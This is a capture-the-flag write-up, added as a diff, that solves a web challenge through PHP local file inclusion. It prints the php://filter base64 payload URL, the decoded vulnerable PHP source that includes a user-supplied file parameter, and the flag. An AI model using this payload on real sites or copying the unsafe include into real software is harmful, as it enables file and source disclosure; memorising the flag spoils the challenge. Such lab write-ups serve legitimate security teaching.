@@ -1,0 +1,57 @@
+# Challenge Description:
+Try to find the flag from the website.
+N:B: I'm a n00b developer.
+link: http://137.184.133.81:15002/?file=index.html
+
+#Solution:
++ Here we use `php://filter` for local file inclusion
++ Above link is a site made of php. So we use `php://filter/convert.base64-encode/resource=index.php`, which allowed me to view the source page of the php file
++ link: http://137.184.133.81:15002/?file=php://filter/convert.base64-encode/resource=index.php
++ We get a base64 encoded string from the above link, which looks like this:
+  PD9waHAKCmlmKGlzc2V0KCRfR0VUWydmaWxlJ10pKXsKICAgIGlmICgkX0dFVFsnZmlsZSddID09ICJpbmRleC5waHAiKSB7CiAgICAgICAgZWNobyAiPGgxPkVSUk9SISE8L2gxPiI7CiAgICAgICAgZGllKCk7CiAgICB9ZWxzZXs
+  KICAgICAgICBpbmNsdWRlICRfR0VUWydmaWxlJ107CiAgICB9Cgp9ZWxzZXsKICAgIGVjaG8gIjxoMT5Zb3UgYXJlIG1pc3NpbmcgdGhlIGZpbGUgcGFyYW1ldGVyPC9oMT4iOwoKICAgICNub3RlIDotIHNlY3JldCBsb2NhdGlvbi
+  AvaG9tZS90YXJlcS9zM2NyRXRfZmw0OS50eHQKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db
+  21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5UYXJlcSdzIEhvbWUgUGFn
+  ZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjwvYm9keT4KPC9odG1sPgo=
+ 
++ We when decode it using base64 decoder, we obtain the below php code:
+```
+  <?php
+
+if(isset($_GET['file'])){
+    if ($_GET['file'] == "index.php") {
+        echo "<h1>ERROR!!</h1>";
+        die();
+    }else{
+        include $_GET['file'];
+    }
+
+}else{
+    echo "<h1>You are missing the file parameter</h1>";
+
+    #note :- secret location /home/tareq/s3crEt_fl49.txt
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tareq's Home Page</title>
+</head>
+<body>
+</body>
+</html>
+```
++ In the above code, we can see " #note :- secret location /home/tareq/s3crEt_fl49.txt"
++ The we give the url file parameter as : http://137.184.133.81:15002/?file=s3crEt_fl49.txt
++ Thus obtained the flag: KCTF{L0C4L_F1L3_1ncLu710n}
+
+
+
+# Reference:
+https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
+
